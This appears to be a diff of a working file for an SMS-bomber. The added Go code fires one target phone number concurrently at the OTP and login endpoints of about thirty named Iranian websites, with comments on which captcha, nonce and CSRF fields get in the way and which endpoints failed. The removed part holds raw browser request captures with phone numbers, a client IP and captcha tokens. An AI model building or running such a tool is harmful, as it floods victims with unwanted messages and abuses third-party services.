@@ -448,6 +448,390 @@ asangem.com
 		}
 
 ❌❌❌❌❌kar nakardand 3:
+ // fafait.net - hasUser
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "operationName": "hasUser",
+            "variables": map[string]interface{}{
+                "input": map[string]string{
+                    "username": phone,
+                },
+            },
+            // extension field was in the example, but might not be strictly needed for basic request
+            // "extensions": map[string]interface{}{ ... },
+        }
+        sendJSONRequest(ctx, "https://web-api.fafait.net/api/graphql", payload, &wg, ch)
+    }
+
+    // fafait.net - with nickname
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            // operationName was not explicitly in the second fafait example, might be inferred or not needed
+            // "operationName": "someOperation",
+            "variables": map[string]interface{}{
+                "input": map[string]string{
+                    "mobile": phone,
+                    "nickname": "TestUser", // می‌توانید این را تغییر دهید یا تصادفی کنید
+                },
+            },
+            // extension field was in the example, but might not be strictly needed
+            // "extensions": map[string]interface{}{ ... },
+        }
+        sendJSONRequest(ctx, "https://web-api.fafait.net/api/graphql", payload, &wg, ch)
+    }
+
+    // tamimpishro.com
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "mobile": phone,
+            "name": "Test Name", // می‌توانید این را تغییر دهید یا تصادفی کنید
+            "national_code": "0000000000", // ممکن است این فیلد اجباری نباشد یا نیاز به مقدار معتبر داشته باشد
+            "referrer": "گوگل",
+            "return_url": "",
+        }
+        sendJSONRequest(ctx, "https://www.tamimpishro.com/site/api/v1/user/otp", payload, &wg, ch)
+    }
+
+    // gateway.telewebion.com (شامل پارامتر دینامیک g-recaptcha-response)
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "code": "98",
+            "phone": phone[1:], // حذف صفر اول اگر نیاز باشد، بر اساس نمونه
+            "smsStatus": "default",
+            // "g-recaptcha-response": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
+        }
+        sendJSONRequest(ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
+    }
+
+    // app.itoll.com
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "mobile": phone,
+        }
+        sendJSONRequest(ctx, "https://app.itoll.com/api/v1/auth/login", payload, &wg, ch)
+    }
+
+    // api.lendo.ir - check-password
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "mobile": phone,
+        }
+        sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/check-password", payload, &wg, ch)
+    }
+
+    // api.lendo.ir - send-otp
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "mobile": phone,
+        }
+        sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/send-otp", payload, &wg, ch)
+    }
+
+    // api.pinorest.com (شامل پارامتر دینامیک captcha)
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "mobile": phone,
+            // "captcha": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
+        }
+        sendJSONRequest(ctx, "https://api.pinorest.com/frontend/auth/login/mobile", payload, &wg, ch)
+    }
+
+    // api.mobit.ir - login
+    wg.Add(1)
+    tasks <- func() {
+         // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "number": phone,
+        }
+        sendJSONRequest(ctx, "https://api.mobit.ir/api/web/v6/register/login", payload, &wg, ch)
+    }
+
+     // api.mobit.ir - register (شامل پارامترهای دینامیک hash_1, hash_2)
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "number": phone,
+             // این پارامترها دینامیک هستند و ممکن است مشکل ایجاد کنند
+            // "hash_1": 1745760096, // این یک عدد است، map[string]string قبول نمیکند
+            // "hash_2": "0d6f656b3e726b9180b9572bd8c670ca79c2766d6ea60ca5b2b0fe34cc41f3eb",
+        }
+        sendJSONRequest(ctx, "https://api.mobit.ir/api/web/v8/register/register", payload, &wg, ch)
+    }
+
+
+    // api.vandar.io (ش شامل پارامتر دینامیک captcha)
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "mobile": phone,
+            // "captcha": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
+            "captcha_provider": "CLOUDFLARE", // این ممکن است ثابت باشد
+        }
+        sendJSONRequest(ctx, "https://api.vandar.io/account/v1/check/mobile", payload, &wg, ch)
+    }
+
+    // drdr.ir
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "mobile": phone,
+        }
+        sendJSONRequest(ctx, "https://drdr.ir/api/v3/auth/login/mobile/init/", payload, &wg, ch)
+    }
+
+    // azki.com
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "phoneNumber": phone,
+            "origin": "www.azki.com",
+        }
+        sendJSONRequest(ctx, "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", payload, &wg, ch)
+    }
+
+    // api.epasazh.com
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "mobile": phone,
+        }
+        sendJSONRequest(ctx, "https://api.epasazh.com/api/v4/blind-otp", payload, &wg, ch)
+    }
+
+    // ws.alibaba.ir
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "phoneNumber": phone,
+        }
+        sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", payload, &wg, ch)
+    }
+
+    // app.ezpay.ir
+     wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "phoneNumber": phone,
+            "os": "Windows",
+            "osVersion": "10",
+            "browser": "Chrome",
+            "browserVersion": "135.0.0.0", // این ورژن ممکن است نیاز به بروزرسانی داشته باشد
+            "device": "",
+            "presenterCode": "",
+        }
+        sendJSONRequest(ctx, "https://app.ezpay.ir:8443/open/v1/user/validation-code", payload, &wg, ch)
+    }
+
+    // api.motabare.ir
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            "mobile": phone,
+        }
+        sendJSONRequest(ctx, "https://api.motabare.ir/v1/core/user/initial/", payload, &wg, ch)
+    }
+
+    // oteacher.org (شامل پارامترهای دینامیک client, timestamp, sign)
+    wg.Add(1)
+    tasks <- func() {
+        // اصلاح نوع payload به map[string]interface{}
+        payload := map[string]interface{}{
+            // "client": "xLjNuxt%2z@", // ممکن است دینامیک باشد
+            "mobile": phone,
+            // "timestamp": time.Now().UnixNano() / int64(time.Millisecond), // شاید نیاز به timestamp فعلی باشد (عدد است)
+            // "sign": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
+        }
+         sendJSONRequest(ctx, "https://oteacher.org/api/user/register/mobile", payload, &wg, ch)
+    }
+
+
+    // اضافه کردن وظایف برای URLهای Form Data (این قسمت نیازی به تغییر نوع payload ندارد چون Form Data همیشه کلید-مقدار رشته‌ای است)
+
+
+
+    // fankala.com (شامل پارامترهای دینامیک csrf, g-recaptcha-response, dig_nounce)
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("action", "digits_check_mob")
+        formData.Set("countrycode", "+98") // یا بر اساس نیاز، ممکن است نیاز به منطق پیچیده تر برای کد کشور باشد
+        formData.Set("mobileNo", phone[1:]) // حذف صفر اول
+        // formData.Set("csrf", "DYNAMIC_VALUE") // این پارامتر دینامیک است
+        formData.Set("login", "2")
+        formData.Set("username", "")
+        formData.Set("email", "")
+        // formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
+        // formData.Set("captcha_ses", "")
+        formData.Set("digits", "1")
+        formData.Set("json", "1")
+        formData.Set("whatsapp", "0")
+        formData.Set("digits_reg_name", "Test Name") // می‌تواند ثابت یا تصادفی باشد
+        formData.Set("digregcode", "+98")
+        formData.Set("digits_reg_mail", phone[1:]) // حذف صفر اول
+        formData.Set("digregscode2", "+98")
+        formData.Set("mobmail2", "")
+        formData.Set("digits_reg_password", "")
+        // formData.Set("g-recaptcha-response", "DYNAMIC_VALUE") // این پارامتر دینامیک است
+        // formData.Set("gglcptch", "")
+        formData.Set("dig_otp", "")
+        formData.Set("code", "")
+        formData.Set("dig_reg_mail", "")
+        // formData.Set("dig_nounce", "DYNAMIC_VALUE") // این پارامتر دینامیک است
+        sendFormRequest(ctx, "https://fankala.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+
+
+    // arastag.ir (شامل پارامتر دینامیک security)
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("action", "mreeir_send_sms")
+        formData.Set("mobileemail", phone)
+        formData.Set("userisnotauser", "")
+        formData.Set("type", "mobile")
+        // formData.Set("security", "DYNAMIC_VALUE") // این پارامتر دینامیک است
+        sendFormRequest(ctx, "https://arastag.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+
+    // zzzagros.com (شامل پارامتر دینامیک nonce)
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("action", "awsa-login-with-phone-send-code")
+        // formData.Set("nonce", "DYNAMIC_VALUE") // این پارامتر دینامیک است
+        formData.Set("username", phone)
+        sendFormRequest(ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+
+    // hamrahsport.com
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("cell", phone)
+        formData.Set("name", "Test Name") // می‌توانید تغییر دهید یا تصادفی کنید
+        formData.Set("agree", "1")
+        formData.Set("send_otp", "1")
+        formData.Set("otp", "")
+        sendFormRequest(ctx, "https://hamrahsport.com/send-otp", formData, &wg, ch)
+    }
+
+    // elecmake.com (شامل پارامتر دینامیک security)
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("action", "vooroodak__submit-username")
+        formData.Set("username", phone)
+        // formData.Set("security", "DYNAMIC_VALUE") // این پارامتر دینامیک است
+        sendFormRequest(ctx, "https://elecmake.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+
+    // roustaee.com (شامل پارامترهای دینامیک csrf, captcha, dig_nounce)
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("action", "digits_check_mob")
+        formData.Set("countrycode", "+98")
+        formData.Set("mobileNo", phone[1:]) // حذف صفر اول
+        // formData.Set("csrf", "DYNAMIC_VALUE") // دینامیک
+        formData.Set("login", "1")
+        formData.Set("username", "")
+        formData.Set("email", "")
+        // formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
+        // formData.Set("captcha_ses", "")
+        formData.Set("digits", "1")
+        formData.Set("json", "1")
+        formData.Set("whatsapp", "0")
+        formData.Set("mobmail", phone[1:]) // حذف صفر اول
+        formData.Set("dig_otp", "")
+        formData.Set("rememberme", "1")
+        // formData.Set("dig_nounce", "DYNAMIC_VALUE") // دینامیک
+        sendFormRequest(ctx, "https://roustaee.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+
+    // nazarkade.com - check.mobile.php
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("countryCode", "+98")
+        formData.Set("mobile", phone[1:]) // حذف صفر اول
+        sendFormRequest(ctx, "https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php", formData, &wg, ch)
+    }
+
+     // nazarkade.com - admin-ajax.php (شامل پارامترهای دینامیک csrf, captcha, dig_nounce)
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("action", "digits_check_mob")
+        formData.Set("countrycode", "+98")
+        formData.Set("mobileNo", phone[1:]) // حذف صفر اول
+        // formData.Set("csrf", "DYNAMIC_VALUE") // دینامیک
+        formData.Set("login", "2")
+        formData.Set("username", "")
+        formData.Set("email", "")
+        // formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
+        // formData.Set("captcha_ses", "")
+        formData.Set("digits", "1")
+        formData.Set("json", "1")
+        formData.Set("whatsapp", "0")
+        formData.Set("digregcode", "+98")
+        formData.Set("digits_reg_mail", phone[1:]) // حذف صفر اول
+        formData.Set("digits_reg_password", "x") // ثابت یا تغییر دهید
+        formData.Set("digits_reg_name", "x") // ثابت یا تغییر دهید
+        formData.Set("dig_otp", "")
+        formData.Set("code", "")
+        formData.Set("dig_reg_mail", "")
+        // formData.Set("dig_nounce", "DYNAMIC_VALUE") // دینامیک
+        sendFormRequest(ctx, "https://nazarkade.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+
+    // api.snapp.express (شامل پارامترهای دینامیک و کوئری پارامتر در URL)
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("cellphone", phone)
+        formData.Set("client", "PWA") // اینها ممکن است ثابت باشند
+        formData.Set("optionalClient", "PWA")
+        formData.Set("deviceType", "PWA")
+        formData.Set("appVersion", "5.6.6") // ممکن است نیاز به بروزرسانی داشته باشد
+        formData.Set("clientVersion", "a4547bd9") // ممکن است نیاز به بروزرسانی داشته باشد
+        formData.Set("optionalVersion", "5.6.6") // ممکن است نیاز به بروزرسانی داشته باشد
+        // formData.Set("UDID", "DYNAMIC_VALUE") // دینامیک
+        // formData.Set("sessionId", "DYNAMIC_VALUE") // دینامیک
+        formData.Set("lat", "35.774") // ممکن است نیاز به تغییر داشته باشد
+        formData.Set("long", "51.418") // ممکن است نیاز به تغییر داشته باشد
+        // formData.Set("captcha", "DYNAMIC_VALUE") // دینامیک
+        formData.Set("optionalLoginToken", "true") // ممکن است ثابت باشد
+
+        // کوئری پارامترها در URL هم وجود دارند که با این تابع sendFormRequest ارسال می شوند
+        urlWithQuery := "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=a4547bd9&optionalVersion=5.6.6&UDID=2bb22fca-5212-47dd-9ff5-e6909df17d6b&sessionId=dc36a2df-587e-412f-96cd-d483d58e3daf&lat=35.774&long=51.418"
+        sendFormRequest(ctx, urlWithQuery, formData, &wg, ch)
+    }
+
+❌❌❌❌❌kar nakardand 4:
 
 
 ---------------------------------------------------------------------------------------------
@@ -465,1128 +849,7 @@ asangem.com
 
 
 
-1:
-Request URL:
-https://filmnet.ir/api-v2/access-token/users/09121111010/approaches
-Request Method:
-GET
-Status Code:
-200 OK
-Remote Address:
-212.33.196.143:443
-Referrer Policy:
-strict-origin-when-cross-origin
 
-{data: {approaches: ["otp"], flag: "new_user"},…}
-data
-: 
-{approaches: ["otp"], flag: "new_user"}
-approaches
-: 
-["otp"]
-0
-: 
-"otp"
-flag
-: 
-"new_user"
-meta
-: 
-{c_key: "user:msisdn:989121111010", operation_result: "success", operation_result_code: 2000,…}
-c_key
-: 
-"user:msisdn:989121111010"
-client_ip
-: 
-"5.232.153.5"
-display_message
-: 
-"موفق"
-machine_name
-: 
-"prod-api-public05"
-operation_result
-: 
-"success"
-operation_result_code
-: 
-2000
-server_date_time
-: 
-"2025-04-27T15:17:19"
-
-2:
-Request URL:
-https://filmnet.ir/api-v2/access-token/users/09121111010%20/otp
-Request Method:
-GET
-Status Code:
-200 OK
-Remote Address:
-212.33.196.143:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{data: {ttl: "00:03:00"},…}
-data
-: 
-{ttl: "00:03:00"}
-ttl
-: 
-"00:03:00"
-meta
-: 
-{c_key: "otp:login:989121111010-Web", operation_result: "success", operation_result_code: 2000,…}
-c_key
-: 
-"otp:login:989121111010-Web"
-client_ip
-: 
-"5.232.153.5"
-display_message
-: 
-"موفق"
-machine_name
-: 
-"prod-api-public01"
-operation_result
-: 
-"success"
-operation_result_code
-: 
-2000
-server_date_time
-: 
-"2025-04-27T15:17:19"
-
-3:
-Request URL:
-https://filmnet.ir/_next/data/7VpbihJYft_dPf3vyUOuO/register/otp.json
-Request Method:
-GET
-Status Code:
-304 Not Modified
-Remote Address:
-212.33.196.151:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{pageProps: {subRoute: "otp", isRegisterRoute: true}, __N_SSG: true}
-pageProps
-: 
-{subRoute: "otp", isRegisterRoute: true}
-isRegisterRoute
-: 
-true
-subRoute
-: 
-"otp"
-__N_SSG
-: 
-true
----------------------------------------------------------------------------------------------
-Request URL:
-https://fankala.com/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-5.144.131.244:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-action: digits_check_mob
-countrycode: +98
-mobileNo: 912 345 6456
-csrf: 781f3959e4
-login: 2
-username: 
-email: 
-captcha: 
-captcha_ses: 
-digits: 1
-json: 1
-whatsapp: 0
-digits_reg_name: fsfhsk
-digregcode: +98
-digits_reg_mail: 912 345 6456
-digregscode2: +98
-mobmail2: 
-digits_reg_password: 
-g-recaptcha-response: 03AFcWeA6n97-5_U7qMsaaRmmBwzvWtcRYAG066Bse0c1UTgVl9zU8skwW8tyn6QSZ3_5N2X9dV4Y5MYYnQFLOdhwnnranaL2X_9QMWezeDOynCFf9AayTvtiSANdYz2t2ade8y68tTEmbx611nb7Flfh9xci6SQMyY4SIxjD1JfshBqZEhvjjjAYHxroTAZSi2tSJzjbFGgczEZ4EAc0KVHaD9CGBWVEaKUOjd3GdDByyvvPq91BRpGjbeG9zpnr2kRNQ8mCXTeDmYtR0BfKXDPP6Dx3K9G6PFHMdzPjZMczSOBFaQQeZ3ZmRwzVc6DngPbM-Cd_fAfbF7mbnc_O872WrgRffOqM3szii4qBubdPbEWYHEXVvKyd83j11P0MOpdXZkftztaTLgd0Y-yZjtbZbszYoaudcBHcuaY2ah1ubK3O8m7tBu0n1hlsnW0QR2ifK08QVt7efbk545c5UlpSxVH744P1zAFAf2kh1GtlqToTdX3LGGPRdh2Ux6H-43QlRKcI6UEUUceCYPGS6xbIX-4WSMlkwTiOzuoudDRsdBXiL9CpxFA3L4oX5EH6lohywsiJH-GchruE2Av-mPajuIkpNSJEcUPxv4Gm6UEYEjiDgJCxXf9k9R_sPz9YF4qTldSEh-1wkIWQv_CrMW7DNQ1fOSbSJmvTWkWRYVhjGsVwkEizj8FcBLTbW_3PmnLYz-eP_ukj4pBZ7kXyVmIeaBZGbK6mmivtpO2ei4zoarI_NDgbj7WZDHcC46xbfwJzvBQBsa29CalzEDCEAOYrQ6SdiM2HcECoUKLGAzmKXR_JpdQfqiSD6jyIBL5beYIUCQ2FTpcXCTXcZmjekAmJVVnLzuSQ5RHxMTBO7_rKH9TXyNq3ZuJ5eEWW7OJSiZnV4OkRqW6SXqLEm-gSvorOpFhMNY46S04oa9x9yQlyrVDU07qGOVLSvlttorXXm_EZ6dBqOC_bN4R-2y9KLiCzJTQMZZ4j-Ece01ya0LY0piXisYnC42jEeIW9-2p303Jx5Vpbt-rwb7a9TVTlkIiRVTCQgZugUo9sOfCnW_VxKlPw3xFz20u8UWljcIOw1yNYtnKKY-9YP2gdem1XYLLAQL7bnu6mEaVJOQrS_7nwnIRPPcSnYjlxcdBltkhKTbbBWbUtANXHZ3BDp_J35BE6wnZK7WfZtkeMX1hlK7io5WcC3nGo8xpxkK4iLqk6RHpuqNJ2EE32RcVG0wh2tSnh6YxxLrrWm2u94bE4OXofGpvp0ovkU_A9V31ioXu3HgPAh10b2bamb0XpK0yn3qfggYmcee4sUh2CS6oFNFCyVpJd5aeixwh_5BYucHqzlnGVW7UqMR4RGXJ5XTYZGey8iGFDigWhZfyFJw0lBhusTkgfyeliD5B8bRkCukxrAEMJ6NTdipdU8Xonqx8Q8JaXXgbqrZG7nRfRlL4cwqb84kcEmLG9s8yKAEUsG8Z_9vgTCSvPWTwFgNpYvACgSBFligWmIZleohwieL7GIm2C_wZKGIN5hjJIj_NOT40mB2H61fZsqcYDef3MHXSI9cHFKjILdikeKJJ6Wyu8o4fS6z80qVOKoFQcum-Q49zJBzjgV5Ls2rOaylZyMBVfWY0BLN0KNBsddJziLTDVZVFJy0H7Hm9q60bFx8uAg27_RaDAkNu0eEeS5wDHuMOQxYWzkM7f4Yhfgj4tZY6sKNyJ3xy-5GdOAKsDp62s7LTk3JeU3BKSBBIksf9je2RIfaUGS1gAsIu_frWTkxtwd3i0vQ3QHMFFr8zI2cjJmYzRa-flXsw_Jb3s3lQX_yOwY-55YcW6U2OE7f52Gc0oKPq1mEHt2TbFk4cvtuxGzrUYTV3nkZvAPYWdg7eNBlFiyrCb0opOKStH4WKfupCbGYz6wGbKLiJ2uK59QSI8TBf2dcg_1_6XlopZ33TiqRklsOifCJhsj7r4C631cSDZR7hOuQBMDH-0c0ClRcLZqZnohQ9BWCXZBKDog9GqM1lS6C3Nx1bmCdiqEmpik1AjZV17RC0_CPN7AiWfGPfTjn98G7z0kKwjpF6nm
-gglcptch: 
-dig_otp: 
-code: 
-dig_reg_mail: 
-dig_nounce: 781f3959e4
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://web-api.fafait.net/api/graphql
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.229.133.70:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{operationName: "hasUser", variables: {input: {username: "09123456789"}}, extensions: {,…}}
-extensions
-: 
-{,…}
-persistedQuery
-: 
-{version: 1, sha256Hash: "00fbd099cf5cad12af5114cff9e4676649ba70b9c4c6c3d1ebfcd68972bc1a3f"}
-operationName
-: 
-"hasUser"
-variables
-: 
-{input: {username: "09123456789"}}
-input
-: 
-{username: "09123456789"}
-
-2:
-Request URL:
-https://web-api.fafait.net/api/graphql
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.229.133.70:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{variables: {input: {mobile: "09123456789", nickname: "gxgdgdgg g tgdgd"}}, extensions: {,…}}
-extensions
-: 
-{,…}
-persistedQuery
-: 
-{version: 1, sha256Hash: "c86ec16685cd22d6b486686908526066b38df6f4cbcd29bef07bb2f3b18061e6"}
-variables
-: 
-{input: {mobile: "09123456789", nickname: "gxgdgdgg g tgdgd"}}
-input
-: 
-{mobile: "09123456789", nickname: "gxgdgdgg g tgdgd"}
-
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.tamimpishro.com/site/api/v1/user/otp
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-46.245.86.30:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{return_url: "", mobile: "09128887494", referrer: "گوگل", national_code: "1001212110",…}
-mobile
-: 
-"09128887494"
-name
-: 
-"ghhghgh hfhhf"
-national_code
-: 
-"1001212110"
-referrer
-: 
-"گوگل"
-return_url
-: 
-""
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=09122221212
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-no-referrer-when-downgrade
-
-
-cellphone: 09122221212
----------------------------------------------------------------------------------------------
-Request URL:
-https://arastag.ir/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-188.40.23.50:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-action: mreeir_send_sms
-mobileemail: 09122221010
-userisnotauser: 
-type: mobile
-security: a048bd17f3
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.zzzagros.com/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-144.76.114.126:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-action: awsa-login-with-phone-send-code
-nonce: eeddb65692
-username: 09128887484
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://harikashop.com/login?back=my-account
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.13.231.61:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-back: my-account
-username: 09128887484
-action: login
-back: https://harikashop.com/
-ajax: 1
-
-2:
-Request URL:
-https://harikashop.com/login?back=https%3A%2F%2Fharikashop.com%2F
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.13.231.61:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-back: https://harikashop.com/
-id_customer: 
-back: 
-firstname: بثعاهبتنب
-lastname: ببعباثعبهث
-password: fdigijkrotie4t0t4ik
-action: register
-username: 09128887484
-back: https://harikashop.com/
-ajax: 1
----------------------------------------------------------------------------------------------
-Request URL:
-https://hamrahsport.com/send-otp
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-194.5.205.16:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-cell: 09123456456
-name: Kdkfjdj
-agree: 1
-send_otp: 1
-otp: 
----------------------------------------------------------------------------------------------
-Request URL:
-https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.165.205.2:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-{code: "98", phone: "9128887474", smsStatus: "default",…}
-code
-: 
-"98"
-g-recaptcha-response
-: 
-"P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUmE1T2pQOEFCbUdBZ0tWa005MjRDNmJDUWFUM0RBbUVXS2s4eGJybk5qMGVlcko1QW5vOTdycDdKcDIyQWlGSnEzNnZsZUFJNnRjcFJDVnA0TDF4eGdSUHBCN3ZYejJPWnV2dUpyQm9DcDZNS3lsa3l0aFdYaEtUQTFzeUk1RHdTQjBZU1BZYURyVkFsS1k2Wkl0SzFHck9nSGJFQWZ3QlY4ejkxM0Q4bkIvU1dJRGNtL0xZNUI2ZzhPVFpTbHI1QUpUT3ZxbXpnSkRUN3lZb3ZuME5PSzNBVkZBTjdvdTRMb0dOTmVVeVNNL2FTYkdYVGtqZElIR25rYnNPUDhOZTVYWFZmajN6Nm01MGpCUE5qS3hFSy9xZEZnVyswaGtTMk8zMzRuN0pYY0dxd1ZWY0tPek5Fdk1Xb1hWcklRblZ1VG5NUys1Q3R5QWhZeWw0dGFLMUJMZDhibEt2ejRjeTRZKy8zRXBYV3U4KzFPRHhLbFkxTmVSTjdXVUlHc2tOaS91bEtYNC90clM3TVV1bXlDT0hYTVdIQjAzTEZtZWVUc2JrbVZZSW0vVG9nQ25IRFRiK3VyVVNvaTVoeXh2ZUYvTUR5U1MvanVBRnB1VU1iYkIxT0xMdlJXb1oxemJkcFdnTmR4RUdncjYrbFJBNm1ucGVWc3BvN3UweUl6b3FLc3c0UUhnaWZGYzhWSldQbWZoWk9hTWs5anJjdnNTQUlyM3R6U2s4MExCZm1TMWZLWmVmMW55V3RCT0w0K0FnQXgzak4ray9RMHBVODAva3hXQ094Tnh1UFVPbkhpektuanpPSnQ5R2FjUWJPUFN6S212d1RzdXZMc0tYbXZXYTV1L3ljeVg4d1JxR01qSkV2U1lnSVllYUtxY2txRzRUMWJ0NTJsNlNaTlVRQ2FNKzErK1lUQmd0OFlHRml0a3JwS1dPUkI0VnRGaVNjYnIrMnNuMUdtR1luQmRzUE1XcktiS1dmV3FmdDNRMVRLVHJjSnNqUzNieU5ZM1JreEFuRXlzRDQwNVdyU0dGUkpLVnBxMkN2VWFCbDlBU3kvMlkxUTRLbDFjK3AvanlhT0VyenZkVU5rb05nZ1lkSHExT3V0Mm9INnI4dG1vaXZOdUJwZ3hkZzloamhSYjJTR3hOMW92dm9QVDZ1ZEtJVFhVV1pDSHlGVmdCRWRZOVVZMlNnYllja1VRMXZEeTRQQkxJMlJXOTgyeitqLy9Lclg2SHhZV2lTdU9VdmZRRkdUdXVSeFVnWHJOUVFqbkR6WmpzR2VMR1lCaHN0SFQyeFhRdGsycFVicHNMMG4vN0FDMVFkcWNvNmgwd3JsVmgvV3BEbTJyTnB5dGVYam1ZdmYrak1uY2NuV0ZxK0d3clpvL0NKRW5mRm13ejF5cUlJZGh3TDlzbjVMRW9NWk5GbG9xR2I5U05qZVNsSERyaGs4Nnk5MXhoZUN1dS9MVSt6YnMvSmk5NkYvVTdBUTc3NEVET08yT0drWUFscTFjMTB6ZFdrTEs4UlJ2bERmaW9KZzlWeUhBN1QrYjFFSi9Td2g0bkV0WEo3UXlpQ3ZqWCt1V3p1SU9peFl1ait3NEFHbGczRTYxWTFBamowa0FFWllscmlBZ3M2QnczeERrL3dOUFNYK1VubGFyR3kyT3ROb01CbmFFYkxWejNwVnRqWlBGa05BZk00dUllZlZicERNTHBzVWNvWjdNeFo0bWZRUURjRmVVNWJxbnRWS3pWaGV0UDBxa3NiREJDQW1qZjFEczRuK01TVnhqcHdDcm9OemlpSWQrenhFby81Y0hqN3Q3L1BwYXVneFBpZ0JEWkhNOTFMS2hKS3EvbDNFMXFPd3BkeXJYYVZSaUZuTTB4VVhtSjBvV0t0NWxhUnVTWVBNaEI4RVBSSktpNWlsbW1nakw2VmswTWdYT0dEZGpsekJWYTZXeTFibDNXSW12YlJ4bWJySFBLZ2hLdXgxZmpLUkFuM2tUL0JPcFRJOWVkSk5GYXllNkJxdHlPQ1VkR1hqaWxla0ttb0kycHR